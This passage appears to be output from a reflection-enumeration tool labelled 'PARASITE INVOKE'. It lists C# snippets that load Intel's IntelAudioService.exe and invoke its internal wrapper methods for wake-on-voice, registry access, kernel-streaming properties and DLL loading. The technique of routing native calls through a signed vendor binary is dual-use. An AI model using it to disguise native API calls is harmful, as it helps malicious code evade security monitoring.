        var methodInfo = t.GetMethod(""SetIntelClientProxyCpDestroyStreamDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpDestroyStreamDelegate _cpDestroyStreamDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpStartDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpStartDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpStartDelegate _cpStartDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpStopDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpStopDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpStopDelegate _cpStopDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpGetBufferDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpGetBufferDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpGetBufferDelegate _cpGetBufferDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpEventQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpEventQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpEventQueryDelegate _cpEventQueryDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpFarfieldSupportQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpFarfieldSupportQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpFarfieldSupportQueryDelegate _cpFarfieldSupportQueryDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpAudioFormatQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpAudioFormatQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpAudioFormatQueryDelegate _cpAudioFormatQueryDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpApiVersionQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpApiVersionQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpApiVersionQueryDelegate _cpApiVersionQueryDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaDetectorGetCapsDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaDetectorGetCapsDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaDetectorGetCapsDelegate _acaDetectorGetCapsDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaRegisterNotificationHandleDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaRegisterNotificationHandleDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaRegisterNotificationHandleDelegate _acaRegisterNotificationHandleDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaUnregisterNotificationHandleDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaUnregisterNotificationHandleDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaUnregisterNotificationHandleDelegate _acaUnregisterNotificationHandleDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaStartSoundDetectDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaStartSoundDetectDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaStartSoundDetectDelegate _acaStartSoundDetectDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaStopSoundDetectDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaStopSoundDetectDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaStopSoundDetectDelegate _acaStopSoundDetectDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaSetIpParamDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaSetIpParamDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaSetIpParamDelegate _acaSetIpParamDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaGetIpParamDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaGetIpParamDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaGetIpParamDelegate _acaGetIpPramDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaContextQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaContextQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaContextQueryDelegate _acaContextQueryDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyGetAcaApiVersionDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyGetAcaApiVersionDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { GetAcaApiVersionDelegate _getApiVersionDelegate });
        ===END SIGNATURE===

Method: SetLogMessageDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Logger.AudioServiceLogger"", true);
        var methodInfo = t.GetMethod(""SetLogMessageDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { LoggerDelegate _loggerDelegate });
        ===END SIGNATURE===

Method: LogWppMessage
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Logger.WppLogger"", true);
        var methodInfo = t.GetMethod(""LogWppMessage"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { string _message });
        ===END SIGNATURE===

Method: IWoVInitSession
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVInitSession"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { UInt32& _sessionID });
        ===END SIGNATURE===

Method: IWoVDestroySession
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVDestroySession"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { uint _sessionID });
        ===END SIGNATURE===

Method: IWoVInit
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVInit"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { uint _sessionID, IntelWovSdkComponent _component });
        ===END SIGNATURE===

Method: IWoVReset
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVReset"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { uint _sessionID, IntelWovSdkComponent _component });
        ===END SIGNATURE===

Method: IWoVSetAttribute
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVSetAttribute"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { IntelWovSdkConfigAttribute _attributeID, IntPtr _value });
        ===END SIGNATURE===

Method: IWoVSetBinAttribute
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVSetBinAttribute"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { IntelWovSdkConfigBinAttribute _attributeID, IntPtr _blob });
        ===END SIGNATURE===

Method: IWoVSetModel
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVSetModel"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { uint _sessionID, IntPtr _model });
        ===END SIGNATURE===

Method: IWoVSetModelThreshold
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVSetModelThreshold"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { uint _sessionID, uint _modelIndex, float _threshold });
        ===END SIGNATURE===

Method: IWoVPrepareLpeData
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVPrepareLpeData"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { uint _sessionID, IntPtr _lpeBuffer, UInt32& _lpeBufferSize });
        ===END SIGNATURE===

Method: GetEndpoints
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.EndpointDeviceManagerMethods"", true);
        var methodInfo = t.GetMethod(""GetEndpoints"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr& _endpointProxyList, UInt32& _endpointProxyCount });
        ===END SIGNATURE===

Method: KsProperty
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.KsPropertyMethods"", true);
        var methodInfo = t.GetMethod(""KsProperty"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _ksInterface, IntPtr _ksProperty, uint _propertySize, IntPtr _propertyData, uint _propertyDataSize, UInt32& _bytesReturned });
        ===END SIGNATURE===

Method: CreateFarfieldDllClientInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""CreateFarfieldDllClientInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.FarfieldClientSafeHandle result = (IntelAudioService.ControlModuleWrapper.FarfieldClientSafeHandle) methodInfo.Invoke(null, new object[] { string _dllName });
        ===END SIGNATURE===

Method: DisposeFarfieldClient
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""DisposeFarfieldClient"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _ffClientPtr });
        ===END SIGNATURE===

Method: UpdateWovConfiguration
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""UpdateWovConfiguration"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _buffer, ulong _size });
        ===END SIGNATURE===

Method: UpdateReferenceWovConfiguration
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""UpdateReferenceWovConfiguration"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _buffer, ulong _size });
        ===END SIGNATURE===

Method: UpdatePpConfiguration
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""UpdatePpConfiguration"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _buffer, ulong _size });
        ===END SIGNATURE===

Method: UpdateDvConfiguration
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""UpdateDvConfiguration"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _buffer, ulong _size });
        ===END SIGNATURE===

Method: UpdateMicGeoConfiguration
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""UpdateMicGeoConfiguration"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _buffer, ulong _size });
        ===END SIGNATURE===

Method: Verify
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""Verify"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _inputBuffer, ulong _inputBufferSize, IntPtr _outputBuffer, ulong _outputBufferSize, UInt64& _bytesReturned });
        ===END SIGNATURE===

Method: Reset
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""Reset"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr });
        ===END SIGNATURE===

Method: GetServiceRegistryStateKeyExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.IntelRegistryMethods"", true);
        var methodInfo = t.GetMethod(""GetServiceRegistryStateKeyExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _serviceStatusHandle, SERVICE_REGISTRY_STATE_TYPE _stateType, IntPtr& _serviceStateKey });
        ===END SIGNATURE===

Method: GetRegKeyValueExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.IntelRegistryMethods"", true);
        var methodInfo = t.GetMethod(""GetRegKeyValueExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _hKey, string _keyName, IntPtr& _keyValue });
        ===END SIGNATURE===

Method: ReadInterfaceRegistryKeyExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.IntelRegistryMethods"", true);
        var methodInfo = t.GetMethod(""ReadInterfaceRegistryKeyExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { string _deviceName, IntPtr& _registryKey });
        ===END SIGNATURE===

Method: RegCloseKeyExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.IntelRegistryMethods"", true);
        var methodInfo = t.GetMethod(""RegCloseKeyExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _keyValue });
        ===END SIGNATURE===

Method: CreatePpDllClientInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""CreatePpDllClientInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.PpDllClientSafeHandle result = (IntelAudioService.ControlModuleWrapper.PpDllClientSafeHandle) methodInfo.Invoke(null, new object[] { string _ppDllPath });
        ===END SIGNATURE===

Method: DisposePpDllClient
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""DisposePpDllClient"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _ppDllClientHandle });
        ===END SIGNATURE===

Method: IntelSstPreProcGetSize
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcGetSize"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
